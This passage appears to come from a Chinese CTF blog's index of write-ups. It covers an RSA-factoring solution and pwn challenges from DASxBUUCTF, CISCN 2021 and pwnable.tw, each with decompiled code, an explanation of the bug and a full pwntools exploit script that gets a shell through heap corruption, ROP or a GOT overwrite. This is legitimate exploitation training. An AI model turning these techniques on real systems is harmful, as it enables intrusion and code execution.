RSA.importKey(private.read()) n, e, d, p, q = Key.n, Key.e, Key.d, Key.p, Key.q m = pow(c, d, n) print(\"明文：\", libnum.n2s(m)) return with open(public_name, 'r') as public: key = RSA.importKey(public.read()) n, e = key.n, key.e print(\"n=\", n) print(\"e=\", e) print(\"c=\", c) 解得 n = 98432079271513130981267919056149161631892822707167177858831841699521774310891 e = 65537 c = 6793000449683458761243147198477390385097096925500467689087326832717298959098 c = 70099856477856647119324475779448956753505959373194081911451122574748717928011 c = 5077560311513279671817430508125151837396585328082180175253360345086848717946 256的n暴力分解，得到p，q p = 302825536744096741518546212761194311477 q = 325045504186436346209877301320131277983 p = 302825536744096741518546212761194311477 q = 325045504186436346209877301320131277983 e = 65537 c = int(input(\"c=\")) phi = (p - 1) * (q - 1) n = p * q d = gmpy2.invert(e, phi) m = pow(c, d, n) #print(\"明文：\", libnum.n2s(m)) string = long_to_bytes(m) print(string) ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#ras256"},{"categories":["Writeups"],"content":"安恒五月赛常规pwn ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#安恒五月赛"},{"categories":["Writeups"],"content":"ticketdele函数中，没有检查下标为负数的情况，所以可以通过age来伪造chunk指针构成double free，然后malloc_hook和realloc_hook配合get shell from pwn import * context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # p = process('./ticket',env={'LD_PRELOAD':'./libc-2.23.so'}) p = remote('node3.buuoj.cn',27905) libc =ELF('./libc-2.23.so') def add(idx, size): p.sendlineafter('\u003e\u003e ','1') p.sendlineafter('Index: ', str(idx)) p.sendlineafter('size: ', str(size)) def dele(idx): p.sendlineafter('\u003e\u003e ','2') p.sendlineafter('Index: ', str(idx)) def edit(idx,data): p.sendlineafter('\u003e\u003e ','3') p.sendlineafter('Index: ', str(idx)) p.sendafter('remarks: ',data) def show(idx): p.sendlineafter('\u003e\u003e ','4') p.sendlineafter('Index: ', str(idx)) def edit_info(name,say,age): p.sendlineafter('\u003e\u003e ','5') p.sendlineafter('name: ', str(name)) p.sendlineafter('fei):', str(say)) p.sendlineafter('age: ',str(age)) def show_info(): p.sendlineafter('\u003e\u003e ','6') p.sendlineafter('name: ', 'name') p.sendlineafter('fei):', 'say') p.sendlineafter('age: ',str(0x101)) add(0,0x100) add(1,0x20) add(2,0x60) add(3,0x60) add(4,0x60) add(5,0x60) dele(0) add(0,0x100) show(0) malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) -88 -0x10 libcbase = malloc_hook - libc.sym['__malloc_hook'] leak('libc base',libcbase) realloc = libcbase + libc.sym['realloc'] one = [0x45216, 0x4526a, 0xf02a4, 0xf1147] og = libcbase + one[1] dele(-1) dele(-2) show_info() p.recvuntil('Name: ') heap = u64(p.recvuntil('\\n',drop= True).ljust(8,'\\x00')) - 0x30 + 0x1a0+0x10 leak('heap',heap) dele(0) dele(1) dele(2) # 60 edit_info(p64(heap),p64(heap),heap) dele(3) # 60 dele(-3) # 60 add(0,0x60) edit(0,p64(malloc_hook-0x23)) add(1,0x60) add(2,0x60) add(3,0x60) # malloc_hook edit(3,'a'*(13-2)+p64(og)+p64(realloc)) # gdb.attach(p) dele(1) add(1,0x20) p.interactive() ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#ticket"},{"categories":["Writeups"],"content":"cardedit有off-by-one，打tcache_struct来leak libc，然后malloc_hook写og from pwn import * context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) # env={'LD_PRELOAD':'./libc.so'} # p = process('./pwn') p = remote('node3.buuoj.cn',26067) libc = ELF('./libc.so') def add(idx,size,data): p.sendlineafter('choice:','1') p.recvuntil('card:') p.sendline(str(idx)) p.recvuntil('power:') p.sendline(str(size)) p.recvuntil('quickly!') p.send(data) def dele(idx): p.sendlineafter('choice:','3') p.recvuntil('card:') p.sendline(str(idx)) def edit(idx,data): p.sendlineafter('choice:','2') p.recvuntil('card') p.sendline(str(idx)) p.recvuntil('show') p.sendline(data) def show(idx): p.sendlineafter('choice:','4') p.recvuntil('index:') p.sendline(str(idx)) one = [0x4f2c5, 0x4f322, 0x10a38c] add(0, 0x18, '0'*8) # 0x20 add(1, 0x38, '1'*8) # 0x40 add(2, 0x38, '2'*8) # 0x40 add(3, 0x38, '3'*8) # 0x40 edit(0,'a'*0x18+'\\x81') dele(1) dele(3) dele(2) add(1, 0x78, '\\x00') # 0x81 show(1) heap = u64(p.recvuntil('\\x56')[-6:].ljust(8,'\\x00')) -0x2c0 -0x40 leak('heap',heap) tcache = heap + 0x10 payload = '\\x00'*0x38 + p64(0x41) + p64(tcache) edit(1,payload) add(2, 0x38, 'A'*18) add(3, 0x38, 'A'*38) # tcache dele(3) add(3, 0x68,'a'*8) show(3) malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 672 - 0x10 leak(\"malloc_hook\",malloc_hook) libcbase = malloc_hook - libc.sym['__malloc_hook'] free_hook = libcbase + libc.sym['__free_hook'] leak('libcbase',libcbase) og = libcbase + one[2] edit(3,p64(malloc_hook)*13) # show(3) add(6,0x20,p64(og)*2) # gdb.attach(p) p.sendlineafter('choice:','1') p.recvuntil('card:') p.sendline(str(7)) p.recvuntil('power:') p.sendline(str(66)) p.interactive() ","date":"2021-06-03","objectID":"/2021dasxbuuctf-may/:0:0","series":null,"tags":["Writeups"],"title":"2021DASxBUUCTF May","uri":"/2021dasxbuuctf-may/#card"},{"categories":["Writeups"],"content":"Ciscn2021-pwn国赛部分pwn题的解答 ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#ciscn2021-pwn"},{"categories":["Writeups"],"content":"lonelywolfdouble_free leak heap address ，打tcache_struct,leak libc，控制 next指针覆写__malloc_hook为og from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch = 'amd64' , os = 'linux', log_level='debug') # p = process(\"./lonelywolf\",env={'LD_PRELOAD':\"./libc-2.27.so\"}) p = remote('123.60.210.12',21885) def add(size): p.sendlineafter(\"Your choice: \", '1') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Size:\", str(size)) def delete(): p.sendlineafter(\"Your choice: \", '4') p.sendlineafter(\"Index:\", '0') def edit(payload): p.sendlineafter(\"Your choice: \", '2') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Content: \", payload) def show(): p.sendlineafter(\"Your choice: \", '3') p.sendlineafter(\"Index:\", '0') libc = ELF('./libc-2.27.so') one = [0x4f3d5,0x4f432,0x10a41c] if __name__ == \"__main__\": add(0x78) delete() edit('8'*9) delete() show() heap_base = u64(p.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) - 0x260 print(hex(heap_base)) # edit('8'*9) # delete() # pause() edit(p64(heap_base+0x10)) add(0x78) add(0x78) # ub edit('A'*0x30) # add(0x10) delete() show() malloc_hook = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 96 - 0x10 libcbase = malloc_hook - libc.sym['__malloc_hook'] print(hex(libcbase)) # add(0x78) edit(p64(malloc_hook)*10) add(0x10) og = libcbase+one[2] edit(p64(og)) # gdb.attach(p) show() p.interactive() flag = CISCN{iMf3k-MX3gi-NxKKS-IWx8t-5HlNV-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#lonelywolf"},{"categories":["Writeups"],"content":"pwny数组超界，使用fini_array泄露程序基址，environ泄露栈，覆盖返回地址为og from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch = 'amd64' , os = 'linux', log_level='debug') # p = process(\"./pwny\",env={'LD_PRELOAD':\"./libc-2.27.so\"}) libc = ELF('./libc-2.27.so') def read(idx): p.sendlineafter('Your choice: ','1') p.sendafter('Index:',p64(idx)) def write(idx,data): p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(idx)) p.sendline(data) one = [0x4f3d5,0x4f432,0x10a41c] # fini_array = 0x201D88 # base = 0x202060 if __name__ == \"__main__\": p = remote('123.60.210.12',21970) p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(256)) p.sendlineafter('Your choice: ','2') p.sendlineafter('Index:',str(256)) write(256, '\\x00'*8) read(0xfffffffffffffffc) p.recvuntil('Result: ') stderr_addr = int(p.recv(12),16) libcbase = stderr_addr - libc.sym['_IO_2_1_stderr_'] print(hex(stderr_addr)) print(hex(libcbase)) # idx = 0xfffffffffffffffc-1 read(0xffffffffffffffa5) # gdb.attach(p) p.recvuntil('Result: ') text_addr = int(p.recv(12),16) textbase = text_addr - 0x9c0 print(hex(textbase)) env = libcbase + libc.sym['environ'] print(hex(env)) # stack = env - 0x10 base = 0x202060 + textbase print(hex(base)) # pause() idx = (env - base)/8 # idx = (~idx) + 1 # print(hex(idx)) read(idx) p.recvuntil('Result: ') stack_addr = int(p.recv(12),16) ret_addr = stack_addr - 0x120 print(hex(ret_addr)) og = libcbase + one[2] idx = (ret_addr - base )/8 # gdb.attach(p) write(idx, p64(og)) p.interactive() flag = CISCN{5o9ui-tLK7G-D1sUb-VrApG-dIhAm-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#pwny"},{"categories":["Writeups"],"content":"silverwolf泄漏libc和劫持__free_hook和lonely一样，找chunk分开写ROP，利用setcontext来控制栈迁移，需要两次栈迁移。 from pwn import * context.terminal = ['tmux', 'splitw', '-h'] context(arch='amd64', os='linux', log_level='debug') # p = process(\"./silverwolf\", env={'LD_PRELOAD': \"./libc-2.27.so\"}) libc = ELF('./libc-2.27.so') p = remote('123.60.210.12', 21921) def add(size): p.sendlineafter(\"Your choice: \", '1') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Size:\", str(size)) def delete(): p.sendlineafter(\"Your choice: \", '4') p.sendlineafter(\"Index:\", '0') def edit(payload): p.sendlineafter(\"Your choice: \", '2') p.sendlineafter(\"Index:\", '0') p.sendlineafter(\"Content: \", payload) def show(): p.sendlineafter(\"Your choice: \", '3') p.sendlineafter(\"Index:\", '0') if __name__ == \"__main__\": add(0x58) delete() edit('8'*9) delete() show() p.recvuntil(\"Content: \") heap_base = u64(p.recv(6)+'\\x00'*2) - 0x1880 print(hex(heap_base)) # gdb.attach(p) edit(p64(heap_base + 0x10)) add(0x58) add(0x58) # ub edit('\\x07'*0x30) delete() show() p.recvuntil(\"Content: \") libcbase = u64(p.recv(6)+'\\x00'*2) - 0x3ebca0 free_hook = libcbase + libc.sym['__free_hook'] write_addr = libcbase + libc.sym['write'] setcontext = libcbase + libc.sym['setcontext']+53 print(hex(libcbase)) pop_rdi = 0x215bf + libcbase pop_rsi = 0x23eea + libcbase pop_rax = 0x43ae8 + libcbase pop_rdx = 0x01b96 + libcbase pop_rsp = 0x03960 + libcbase read_call = 0x110140 + libcbase syscall_ret = 0xd2745 + libcbase payload = '\\x01\\x00\\x00\\x00\\x00\\x07\\x07'+ '\\x00'*(64 - 7) + p64(free_hook) + p64(0) * 2 edit(payload) add(0x10) edit(p64(setcontext)) add(0x68) add(0x68) add(0x68) edit(p64(heap_base+0x1210+8)+p64(pop_rdi)) add(0x78) add(0x78) payload=p64(read_call)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)+p64(write_addr) edit(payload) add(0x78) flag = heap_base+0x1210+8+0x60 orw = '' orw+= p64(pop_rdi)+p64(flag)+p64(pop_rax)+p64(2)+p64(syscall_ret) orw+= p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30) orw+= p64(pop_rsp)+p64(heap_base+0x1210-0xa0) edit(orw+\"./flag\\x00\") #gdb.attach(p) delete() p.interactive() flag = CISCN{NEqT9-o7fw0-qYWHr-uPwKk-qJj0T-} ","date":"2021-05-26","objectID":"/ciscn2021-pwn/:0:0","series":null,"tags":["Writeups"],"title":"Ciscn2021 Pwn","uri":"/ciscn2021-pwn/#silverwolf"},{"categories":["Writeups"],"content":"Challenges_100-Week_10 Challenges Tricks pwnble.tw-silver_bullet stack overflow pwnable.tw-applestore UAF in stack pwnable.tw-Re-alloc UAF+tcache poisoning pwnable.tw-Tcache Tear tcache poisoning Lilac 2021 五一欢乐赛-babyFAT 数组超界 Lilac 2021 五一欢乐赛-befunge 数组超界 Lilac 2021 五一欢乐赛-noleak house_of_roman+IO_file leak ","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#challenges_100-week_10"},{"categories":["Writeups"],"content":"silver_bullet","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#silver_bullet"},{"categories":["Writeups"],"content":"checksec Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec"},{"categories":["Writeups"],"content":"IDAcreate int __cdecl create_bullet(char *s) { size_t v2; // [esp+0h] [ebp-4h] if ( *s ) return puts(\"You have been created the Bullet !\"); printf(\"Give me your description of bullet :\"); read_input(s, 0x30u); v2 = strlen(s); printf(\"Your power is : %u\\n\", v2); *((_DWORD *)s + 12) = v2; return puts(\"Good luck !!\"); } power_up int __cdecl power_up(char *dest) { char s[48]; // [esp+0h] [ebp-34h] BYREF size_t v3; // [esp+30h] [ebp-4h] v3 = 0; memset(s, 0, sizeof(s)); if ( !*dest ) return puts(\"You need create the bullet first !\"); if ( *((_DWORD *)dest + 12) \u003e 0x2Fu ) return puts(\"You can't power up any more !\"); printf(\"Give me your another description of bullet :\"); read_input(s, 48 - *((_DWORD *)dest + 12)); strncat(dest, s, 48 - *((_DWORD *)dest + 12)); v3 = strlen(s) + *((_DWORD *)dest + 12); printf(\"Your new power is : %u\\n\", v3); *((_DWORD *)dest + 12) = v3; return puts(\"Enjoy it !\"); } 我尝试运行程序，输入几个垃圾数据，发现在power_up中，能覆盖长度，从而得到一个很大的数，从而在beat中正常退出程序执行ROP。 所以漏洞点在power_up中。这里在strncat在拼接字符串后，会在最后加”\\x00“进行截断，可以覆盖大小，产生栈溢出。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name,hex(addr))) context.log_level=\"DEBUG\" context.arch=\"amd64\" local=0 binary='./silver_bullet' #gdb.attach(p) if local: p=process(binary) else: p=remote('chall.pwnable.tw',10103) elf = ELF(binary,checksec=False) libc = ELF('./libc_32.so.6',checksec=False) puts_plt = elf.plt['puts'] read_got = elf.got['read'] #gdb.attach(p) one = [0x3a819, 0x5f065, 0x5f066] #create p.sendlineafter('Your choice :',\"1\") payload='a'*47 p.sendlineafter('Give me your description of bullet :',payload) #power up p.sendlineafter('Your choice :',\"2\") payload='a' p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"2\") payload='\\xff'*7+p32(puts_plt)+p32(0x8048954)+p32(read_got) p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"3\") read_addr = u32(p.recvuntil('\\xf7')[-4:]) leak('read',read_addr) libcbase= read_addr-libc.sym['read'] one_gedget = libcbase+one[0] p.sendlineafter('Your choice :',\"1\") payload='a'*47 p.sendlineafter('Give me your description of bullet :',payload) #power up p.sendlineafter('Your choice :',\"2\") payload='a' p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"2\") payload='\\xff'*7+p32(one_gedget) p.sendlineafter('Give me your another description of bullet :',payload) p.sendlineafter('Your choice :',\"3\") p.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp"},{"categories":["Writeups"],"content":"pwnable.tw-applestore","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-applestore"},{"categories":["Writeups"],"content":"checksec Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-1"},{"categories":["Writeups"],"content":"IDAhandler unsigned int handler() { char nptr[22]; // [esp+16h] [ebp-22h] BYREF unsigned int v2; // [esp+2Ch] [ebp-Ch] v2 = __readgsdword(0x14u); while ( 1 ) { printf(\"\u003e \"); fflush(stdout); my_read(nptr, 0x15u); switch ( atoi(nptr) ) { case 1: list();//列出商品菜单，useless break; case 2: add();//向链表中添加一个商品 break; case 3: delete();//从链表中删除一个商品 break; case 4: cart();//列出链表中所有的商品 break; case 5: checkout(); break; case 6: puts(\"Thank You for Your Purchase!\"); return __readgsdword(0x14u) ^ v2; default: puts(\"It's not a choice! Idiot.\"); break; } } } add unsigned int add() { const char **v1; // [esp+1Ch] [ebp-2Ch] char nptr[22]; // [esp+26h] [ebp-22h] BYREF unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(\"Device Number\u003e \"); fflush(stdout); my_read(nptr, 0x15u); switch ( atoi(nptr) ) { case 1: v1 = (const char **)create(\"iPhone 6\", 199); insert(v1); goto LABEL_8; case 2: v1 = (const char **)create(\"iPhone 6 Plus\", 299); insert(v1); goto LABEL_8; case 3: v1 = (const char **)create(\"iPad Air 2\", 499); insert(v1); goto LABEL_8; case 4: v1 = (const char **)create(\"iPad Mini 3\", 399); insert(v1); goto LABEL_8; case 5: v1 = (const char **)create(\"iPod Touch\", 199); insert(v1); LABEL_8: printf(\"You've put *%s* in your shopping cart.\\n\", *v1); puts(\"Brilliant! That's an amazing idea.\"); break; default: puts(\"Stop doing that. Idiot!\"); break; } return __readgsdword(0x14u) ^ v3; } create char **__cdecl create(const char *a1, char *a2) { char **v3; // [esp+1Ch] [ebp-Ch] v3 = (char **)malloc(0x10u); v3[1] = a2; asprintf(v3, \"%s\", a1); v3[2] = 0; v3[3] = 0; return v3; } 申请了0x10大小的空间，使用asprintf申请商品名称所占用大小的内存空间，并返回指针。asprintf所申请的内存空间需要手动释放。在32位程序下，一个指针占4字节，紧接着的四个字节放入了商品的价格，int类型也是四个字节，其余的0x8字节都置位0。 insert int __cdecl insert(int a1) { int result; // eax _DWORD *i; // [esp+Ch] [ebp-4h] for ( i = \u0026myCart; i[2]; i = (_DWORD *)i[2] ) ; i[2] = a1; result = a1; *(_DWORD *)(a1 + 12) = i; return result; } 0x10的空间在create的时候只使用了0x8，在insert中，首先是一个循环，这个循环是用来遍历链表的。在初始时，myCart为空，直接跳出了循环，之后在其+8的位置放入了将插入的商品的地址，又在商品内存的+12的位置插入了myCart的地址。 到这里就很清晰了，程序使用了一个双向链表来管理商品，其内存布局如下： |chunk head | |name_addr | +0 |price | +4 |fd | +8 |bk | +12 delete unsigned int delete() { int v1; // [esp+10h] [ebp-38h] int v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int v4; // [esp+1Ch] [ebp-2Ch] int v5; // [esp+20h] [ebp-28h] char nptr[22]; // [esp+26h] [ebp-22h] BYREF unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = dword_804B070; printf(\"Item Number\u003e \"); fflush(stdout); my_read(nptr, 0x15u); v3 = atoi(nptr); while ( v2 ) { if ( v1 == v3 ) { v4 = *(_DWORD *)(v2 + 8); v5 = *(_DWORD *)(v2 + 12); if ( v5 ) *(_DWORD *)(v5 + 8) = v4; if ( v4 ) *(_DWORD *)(v4 + 12) = v5; printf(\"Remove %d:%s from your shopping cart.\\n\", v1, *(const char **)v2); return __readgsdword(0x14u) ^ v7; } ++v1; v2 = *(_DWORD *)(v2 + 8); } return __readgsdword(0x14u) ^ v7; } 删除函数，根据商品的序号将商品从链表中删除，指针的更新也很简单： fd-\u003ebk = p-\u003ebk; bk-\u003efd = p-\u003efd; checkout unsigned int checkout(){ int v1; // [esp+10h] [ebp-28h] char *v2[5]; // [esp+18h] [ebp-20h] BYREF unsigned int v3; // [esp+2Ch] [ebp-Ch] v3 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) { puts(\"*: iPhone 8 - $1\"); asprintf(v2, \"%s\", \"iPhone 8\"); v2[1] = (char *)1; //v2 is in the stack !!! insert((int)v2); v1 = 7175; } printf(\"Total: $%d\\n\", v1); puts(\"Want to checkout? Maybe next time!\"); return __readgsdword(0x14u) ^ v3;} 当商品的总价格为7174时，就会将iPhone 8加入链表。 这里注意iPhone 8的内存空间是在栈上的！v2变量在ebp-0x20的位置，这点很重要。 我们知道，在调用函数时，调用者会将被调函数的参数压栈，之后保存栈底的位置，即ebp。在被调函数返回时，并没有对栈进行清空，只是恢复了栈的位置。而其他被调函数还有可能会使用栈上的这个数据。那么如果我们通过一些手段修改了这个数据，就可能造成攻击，看headler的函数调用。 .text:08048C33 loc_8048C33: ; CODE XREF: handler+5E↑j.text:08048C33 ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C33 call list ; jumptable 08048C31 case 1.text:08048C38 jmp short loc_8048C63.text:08048C3A ; ---------------------------------------------------------------------------.text:08048C3A.text:08048C3A loc_8048C3A: ; CODE XREF: handler+5E↑j.text:08048C3A ; DATA XREF: .rodat","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-1"},{"categories":["Writeups"],"content":"exp from pwn import * from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context.arch=\"amd64\" context.terminal = ['tmux', 'splitw', '-h'] binary='./applestore' #gdb.attach(sh) if 'g' in sys.argv[1]: context.log_level=\"DEBUG\" if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw',10104) elf = ELF(binary,checksec=False) #libc = ELF('',checksec=False) puts_got = elf.got['puts'] atoi_got = elf.got['atoi'] mycart = 0x804B068 add = '2';delete='3';cart='4';checkout='5' def do(choice,payload): sh.sendlineafter('\u003e ',choice) sh.sendlineafter('\u003e',payload) for i in range(6): do(add,b'1') for i in range(20): do(add,b'2') do(checkout,b'y') #add iphone-8 payload= b'y\\x00'+p32(puts_got)+p32(0x1)+p32(mycart+8)+p32(1) do(cart,payload) sh.recvuntil('27: ') puts_addr=u32(sh.recv(4)) sh.recvuntil('28: ') heap_addr = u32(sh.recv(4)) leak('puts addr',puts_addr) leak('heap addr',heap_addr) libc = LibcSearcher('puts',puts_addr) libcbase = puts_addr - libc.dump('puts') leak('libc base',libcbase) system = libcbase+libc.dump('system') env = libcbase+libc.dump('environ') payload= b'y\\x00'+p32(env)+p32(0x1)+p32(mycart+8)+p32(1) do(cart,payload) sh.recvuntil('27: ') stack =u32(sh.recv(4)) leak('stack',stack) payload = b'27'+p32(env)+p32(0x1)+p32(atoi_got+0x22)+p32(stack - 0x100 - 0xc) do(delete,payload) sh.sendlineafter('\u003e ',p32(system)+b';/bin/sh') sh.interactive() ","date":"2021-05-07","objectID":"/challenges-100-week-10/:3:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#exp-1"},{"categories":["Writeups"],"content":"pwnable.tw-Re-alloc","date":"2021-05-07","objectID":"/challenges-100-week-10/:0:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#pwnabletw-re-alloc"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled ","date":"2021-05-07","objectID":"/challenges-100-week-10/:1:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#checksec-2"},{"categories":["Writeups"],"content":"IDAadd int allocate() { _BYTE *v0; // rax unsigned __int64 v2; // [rsp+0h] [rbp-20h] unsigned __int64 size; // [rsp+8h] [rbp-18h] void *v4; // [rsp+18h] [rbp-8h] printf(\"Index:\"); v2 = read_long(); if ( v2 \u003e 1 || heap[v2] ) { LODWORD(v0) = puts(\"Invalid !\"); } else { printf(\"Size:\"); size = read_long(); if ( size \u003c= 0x78 ) { v4 = realloc(0LL, size); if ( v4 ) { heap[v2] = v4; printf(\"Data:\"); v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size)); *v0 = 0; } else { LODWORD(v0) = puts(\"alloc error\"); } } else { LODWORD(v0) = puts(\"Too large!\"); } } return (int)v0; } edit int reallocate() { unsigned __int64 v1; // [rsp+8h] [rbp-18h] unsigned __int64 size; // [rsp+10h] [rbp-10h] void *v3; // [rsp+18h] [rbp-8h] printf(\"Index:\"); v1 = read_long(); if ( v1 \u003e 1 || !heap[v1] ) return puts(\"Invalid !\"); printf(\"Size:\"); size = read_long(); if ( size \u003e 0x78 ) return puts(\"Too large!\"); v3 = realloc((void *)heap[v1], size); if ( !v3 ) return puts(\"alloc error\"); heap[v1] = v3; printf(\"Data:\"); return read_input(heap[v1], (unsigned int)size); } free int rfree() { _QWORD *v0; // rax unsigned __int64 v2; // [rsp+8h] [rbp-8h] printf(\"Index:\"); v2 = read_long(); if ( v2 \u003e 1 ) { LODWORD(v0) = puts(\"Invalid !\"); } else { realloc((void *)heap[v2], 0LL); v0 = heap; heap[v2] = 0LL; } return (int)v0; } 程序的各种功能都是由realloc来实现的。realloc有两个参数ptr与size： ptr == NULL：其与malloc等价 ptr != NULL: new size == old size：直接将ptr返回。 new size \u003c old size：将ptr进行分割，剩余部分若大于最小chunk的大小就会被free new size \u003e old size：调用malloc申请一块新的内存，拷贝数据后将old ptr释放 new size == 0：与free等价 在edit中，若new size为0，就相当于对chunk进行了free，free的返回值为0。程序进行了返回，没有将原来的指针进行更新，所以我们可以进行UAF。 got表可写，但是没有show函数，先想办法通过修改got表进行leak。计划修改atoll_got为printf_plt，我们就可以通过格式化字符串漏洞来泄露got表中的地址，从而leak libc。 首先，申请一个chunk，使用edit将其free，并修改其fd指向atoll_got。然后，再将这个chunk申请回来，这时next就会被填入atoll_got。为了不影响最开始的这个tcache bin，我们realloc这个chunk，为一个新大小，然后free掉。这时，这个chunk的key被清空了，但是heap数组中还有这个chunk的指针，而且我么没法直接覆盖，所以我们再次通过realloc修改器key域为垃圾数据，将其free就可以清空heap数组了。最后，一个tcache bin的next不为NULL但是count为0，之后再申请对应的大小就会让count造成溢出。 在leak libc后，还要再次进行修改，所以我们再次使用上述操作，使另一个tcache bin的next指向atoll_got。 ","date":"2021-05-07","objectID":"/challenges-100-week-10/:2:0","series":null,"tags":["Writeups"],"title":"Challenges 100 Week 10","uri":"/challenges-100-week-10/#ida-2"},{"categories":["Writeups"],"content":"exp from pwn import * #from LibcSearcher import LibcSearcher from struct import pack import sys leak = lambda name,addr: log.success('{0}addr ---\u003e {1}'.format(name, hex(addr))) context(arch = 'amd64' , os = 'linux', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] binary='./re-alloc' #gdb.attach(sh) if 'l' in sys.argv[1] and 'r' not in sys.argv[1]: log.info('Test in local...') sh=process(binary) if 'r' in sys.argv[1]: log.info('Attacking...') sh=remote('chall.pwnable.tw', 10106) elf = ELF(binary,checksec=False) libc = ELF('libc.so',checksec=False) def add(idx,size,data): sh.sendlineafter('choice: ','1') sh.sendlineafter('Index:',str(idx)) sh.sendlineafter('Size:',str(size)) sh.sendafter('Data:',data) def edit(idx,size,data): sh.sendlineafter('choice: ','2') sh.sendlineafter('Index:',str(idx)) sh.sendlineafter('Size:',str(size)) if size != 0: sh.sendafter('Data:',data) def dele(idx): sh.sendlineafter('choice: ','3') sh.sendlineafter('Index:',str(idx)) atoll_got = elf.got['atoll'] printf_plt = elf.plt['printf'] add(0,0x18,'a'*0x8) edit(0,0,'') edit(0,0x18,p64(atoll_got)) add(1,0x18,'a'*0x8) edit(0,0x38,'a'*8) dele(0) edit(1,0x38,'b'*0x10) dele(1) add(0,0x48,'a'*0x8) edit(0,0,'') edit(0,0x48,p64(atoll_got)) add(1,0x48,'a'*0x8) edit(0,0x58,'a'*8) dele(0) edit(1,0x58,'b'*0x10) dele(1) add(0,0x48,p64(printf_plt)) sh.sendlineafter('choice: ','1') sh.recvuntil(\"Index:\") sh.sendline('%6$p') stdout_addr = int(sh.recv(14),16) libc.address=stdout_addr 